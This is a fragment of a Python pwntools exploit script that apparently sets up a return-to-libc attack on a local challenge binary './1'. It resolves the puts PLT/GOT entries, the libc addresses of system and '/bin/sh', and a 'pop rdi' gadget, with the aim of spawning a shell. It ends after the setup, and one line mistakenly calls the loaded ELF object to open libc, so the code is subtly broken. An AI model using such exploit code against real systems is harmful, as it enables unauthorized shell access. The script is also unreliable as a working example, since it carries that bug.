from pwn import *

p = process('./1')
elf = ELF('./1')
libc = elf('./libc-2.23.so')

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
puts_libc=libc.symbols['puts']
system_libc=libc.symbols['system']
bin_sh_libc=libc.search("/bin/sh").next()
main_addr=0x400908
rdi_addr=0x400a93



